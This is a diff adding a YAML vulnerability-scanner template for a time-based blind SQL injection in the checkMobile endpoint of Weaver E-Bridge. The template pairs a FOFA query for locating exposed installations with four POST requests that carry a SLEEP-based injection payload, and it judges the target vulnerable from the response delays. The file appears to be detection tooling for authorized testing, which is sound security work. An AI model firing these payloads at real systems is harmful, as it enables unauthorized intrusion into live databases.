@@ -1,0 +1,53 @@
+id: weaver-ebridge-checkmobile-sqli
+info:
+  name: Weaver E-Bridge CheckMobile SQL Injection
+  author: ZacharyZcR
+  severity: critical
+  verified: true
+  description: |
+    Weaver E-Bridge system has a SQL injection vulnerability in the checkMobile interface.
+    The vulnerability allows attackers to execute arbitrary SQL commands and obtain sensitive database information.
+    FOFA: app="泛微-云桥e-Bridge"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-Bridge%E7%B3%BB%E7%BB%9FcheckMobile%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: ecology,ebridge,sqli
+  created: 2024/12/30
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(10-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"mainlogo":') &&
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r1:
+    request:
+      method: POST
+      path: /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(6-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"mainlogo":') &&
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+  r2:
+    request:
+      method: POST
+      path: /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(10-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"mainlogo":') &&
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r3:
+    request:
+      method: POST
+      path: /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(6-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"mainlogo":') &&
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+expression: r0() && r1() && r2() && r3()
